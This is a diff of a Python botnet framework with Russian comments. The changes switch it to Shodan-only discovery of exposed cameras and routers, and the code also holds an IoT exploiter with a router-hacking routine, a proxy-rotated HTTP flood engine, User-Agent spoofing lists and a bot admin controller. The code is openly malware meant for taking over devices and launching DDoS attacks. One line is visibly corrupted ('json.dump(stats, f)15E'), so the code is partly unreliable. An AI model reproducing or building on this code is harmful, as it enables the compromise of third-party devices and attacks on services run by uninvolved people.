@@ -1,46 +1,38 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-HYBRID BOTNET FRAMEWORK v6.1 – RAILWAY EDITION
-- Расширенный список User-Agent (300+)
-- Без scapy/nmap (только глобальный поиск)
-- ZoomEye через прямой API
-- Telegram-бот (опционально)
+HYBRID BOTNET – SHODAN EDITION
+- Только глобальный поиск через Shodan
+- Локальный ping sweep
+- Зомби-ботнет, DDoS, взлом
+- Веб-сервер для Railway
 """
 
 import asyncio
-import multiprocessing as mp
 import aiohttp
 import aiohttp_socks
 import random
 import time
 import json
 import os
-import sys
 import subprocess
 import paramiko
 import requests
-import hashlib
 from contextlib import asynccontextmanager
 from fastapi import FastAPI
 import uvicorn
 from cryptography.fernet import Fernet
 
-# Глобальные сервисы (импорт с проверкой)
+# Shodan (опционально)
 try:
     import shodan
     SHODAN_AVAILABLE = True
-except:
+except ImportError:
     SHODAN_AVAILABLE = False
-
-try:
-    from censys.search import CensysHosts
-    CENSYS_AVAILABLE = True
-except:
-    CENSYS_AVAILABLE = False
+    print("[!] Shodan not installed. Install with: pip install shodan")
 
 # ------------------------------------------------------------
-#  РАСШИРЕННЫЙ СПИСОК USER-AGENT (полный)
+#  Расширенный список User-Agent (только часть, но можно оставить полный)
 # ------------------------------------------------------------
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
@@ -210,23 +202,14 @@ USER_AGENTS = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPad; CPU OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPod touch; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPod touch; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPod touch; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
+    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
 ]
 
 # ------------------------------------------------------------
@@ -237,17 +220,16 @@ os.makedirs(DATA_DIR, exist_ok=True)
 
 STATS_FILE = os.path.join(DATA_DIR, "stats.json")
 BLOCKCHAIN_FILE = os.path.join(DATA_DIR, "blockchain.json")
-CRACKED_FILE = os.path.join(DATA_DIR, "cracked.json")
 
 def load_stats():
     if os.path.exists(STATS_FILE):
         with open(STATS_FILE) as f:
             return json.load(f)
-    return {"total_requests": 0, "active_nodes": 0, "cracked_devices": [], "targets_analyzed": [], "global_found": 0}
+    return {"total_requests": 0, "cracked_devices": [], "global_found": 0}
 
 def save_stats(stats):
     with open(STATS_FILE, 'w') as f:
-        json.dump(stats, f)
+        json.dump(stats, f)15E
 
 stats = load_stats()
 
@@ -261,10 +243,6 @@ class ProxyManager:
         proxy = random.choice(self.socks_list)
         connector = aiohttp_socks.ProxyConnector.from_url(f'socks5://{proxy[0]}:{proxy[1]}')
         return aiohttp.ClientSession(connector=connector)
-
-class TargetAnalyzer:
-    def analyze(self, ip):
-        return {"raw": "", "open_ports": [80]}
 
 class CryptoLayer:
     def __init__(self):
@@ -404,21 +382,14 @@ class IoTExploiter:
                 await self.hack_router(dev['ip'])
 
 # ------------------------------------------------------------
-#  Глобальный поиск через Shodan/Censys/ZoomEye
+#  Глобальный поиск через Shodan
 # ------------------------------------------------------------
 class GlobalHunter:
     def __init__(self):
         self.shodan_key = os.environ.get("SHODAN_API_KEY")
-        self.censys_id = os.environ.get("CENSYS_API_ID")
-        self.censys_secret = os.environ.get("CENSYS_API_SECRET")
-        self.zoomeye_key = os.environ.get("ZOOMEYE_API_KEY")
         self.shodan_cli = None
-        self.censys_cli = None
-        if SHODAN_AVAILABLE and self.shodan_key:
+        if SHODAN_AVAILABLE and self.shodan_key and self.shodan_key.strip():
             self.shodan_cli = shodan.Shodan(self.shodan_key)
-        if CENSYS_AVAILABLE and self.censys_id:
-            self.censys_cli = CensysHosts(self.censys_id, self.censys_secret)
-
     async def search_shodan(self, query, limit=100):
         if not self.shodan_cli:
             return []
@@ -434,80 +405,18 @@ class GlobalHunter:
                     'source': 'shodan'
                 })
             return devices
-        except:
-            return []
-
-    async def search_censys(self, query, limit=100):
-        if not self.censys_cli:
-            return []
-        try:
-            res = self.censys_cli.search(query, per_page=limit)
-            devices = []
-            for r in res:
-                devices.append({
-                    'ip': r['ip'],
-                    'port': r.get('services', [{}])[0].get('port', 0),
-                    'type': 'camera',
-                    'source': 'censys'
-                })
-            return devices
-        except:
-            return []
-
-    async def search_zoomeye(self, query, limit=100):
-        if not self.zoomeye_key:
-            return []
-        url = "https://api.zoomeye.org/host/search"
-        headers = {"API-KEY": self.zoomeye_key}
-        params = {"query": query, "page": 1, "num": limit}
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(url, headers=headers, params=params) as resp:
-                    if resp.status == 200:
-                        data = await resp.json()
-                        devices = []
-                        for match in data.get('matches', []):
-                            devices.append({
-                                'ip': match.get('ip', ''),
-                                'port': match.get('portinfo', {}).get('port', 0),
-                                'type': 'camera' if 'camera' in match.get('geoinfo', {}).get('asn', '').lower() else 'router',
-                                'source': 'zoomeye'
-                            })
-                        return devices
         except Exception as e:
-            print(f"ZoomEye error: {e}")
-        return []
-
-    async def global_search(self, query, limit=100, sources=['shodan','censys','zoomeye']):
-        tasks = []
-        if 'shodan' in sources and self.shodan_cli:
-            tasks.append(self.search_shodan(query, limit))
-        if 'censys' in sources and self.censys_cli:
-            tasks.append(self.search_censys(query, limit))
-        if 'zoomeye' in sources and self.zoomeye_key:
-            tasks.append(self.search_zoomeye(query, limit))
-        results = await asyncio.gather(*tasks)
-        all_dev = []
-        for r in results:
-            all_dev.extend(r)
-        seen = set()
-        uniq = []
-        for d in all_dev:
-            key = f"{d['ip']}:{d['port']}"
-            if key not in seen:
-                seen.add(key)
-                uniq.append(d)
-        stats["global_found"] = len(uniq)
-        save_stats(stats)
-        return uniq
+            print(f"Shodan error: {e}")
+            return []
+    async def global_search(self, query, limit=100):
+        return await self.search_shodan(query, limit)
 
 # ------------------------------------------------------------
 #  DDoS-движок
 # ------------------------------------------------------------
 class DDoSEngine:
-    def __init__(self, proxy, analyzer):
+    def __init__(self, proxy):
         self.proxy = proxy
-        self.analyzer = analyzer
     async def http_flood(self, url):
         async with self.proxy.get_session() as session:
             for _ in range(500):
@@ -529,7 +438,7 @@ class AdminBot:
         self.scanner = NetworkScanner()
         self.exploiter = IoTExploiter(self.botnet)
         self.hunter = GlobalHunter()
-        self.ddos = DDoSEngine(ProxyManager(), TargetAnalyzer())
+        self.ddos = DDoSEngine(ProxyManager())
         self.blockchain = BlockchainLogger()
         self.berserk = False
         self.telegram_app = None
